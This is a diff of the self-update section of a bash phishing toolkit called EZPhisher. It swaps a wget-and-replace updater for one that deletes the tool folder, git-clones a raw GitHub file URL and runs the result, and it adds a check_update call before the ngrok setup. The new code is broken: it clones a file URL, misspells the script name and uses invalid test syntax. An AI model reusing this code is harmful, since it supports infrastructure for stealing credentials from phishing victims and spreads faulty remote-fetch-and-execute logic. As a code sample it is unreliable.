@@ -1,48 +1,22 @@
 #!/bin/bash
-SELF=$(basename $0)
 UPDATE_BASE="https://raw.githubusercontent.com/AnonHexo/EZPhisher/self-update/ezphisher.sh"
 VERSION="1.1"
 NEW_VERSION=$(wget https://raw.githubusercontent.com/AnonHexo/EZPhisher/self-update/.version -q -O -)
 
 update() {
-	echo "Performing self-update..."
-
-# Download new version
-echo -n "Downloading latest version..."
-	if ! wget --quiet --output-document="$0.tmp" $UPDATE_BASE/$SELF ; then
-    echo "Failed: Error while trying to wget new version!"
-    echo "File requested: $UPDATE_BASE/$SELF"
-    exit 1
-fi
-echo "Done."
-
-# Copy over modes from old version
-OCTAL_MODE=$(stat -c '%a' $SELF)
-if ! chmod $OCTAL_MODE "$0.tmp" ; then
-    echo "Failed: Error while trying to set mode on $0.tmp."
-    exit 1
-fi
-
-# Spawn update script
-cat > updateScript.sh << EOF
-#!/bin/bash
-# Overwrite old file with new
-if mv "$0.tmp" "$0"; then
-echo "Done. Update complete."
-rm \$0
-else
-echo "Failed!"
-fi
-EOF
-
-echo -n "Inserting update process..."
-exec /bin/bash updateScript.sh
+	cd $HOME
+	rm -rf ezphisher
+	git clone $UPDATE_BASE
+	cd ezphisher
+	bash ezphihser.sh
 }
 
-if [$VERSION != $NEW_VERSION]; then
-	update
-	VERSION=$NEW_VERSION
-fi
+check_update() {
+	if [$VERSION != $NEW_VERSION]; then
+		update
+		VERSION=$NEW_VERSION
+	fi
+}
 
 clear
 ## ANSI colors (FG & BG)
@@ -600,6 +574,7 @@ main_menu() {
 }
 
 ## Main
+check_update
 kill_pid
 dependencies
 install_ngrok
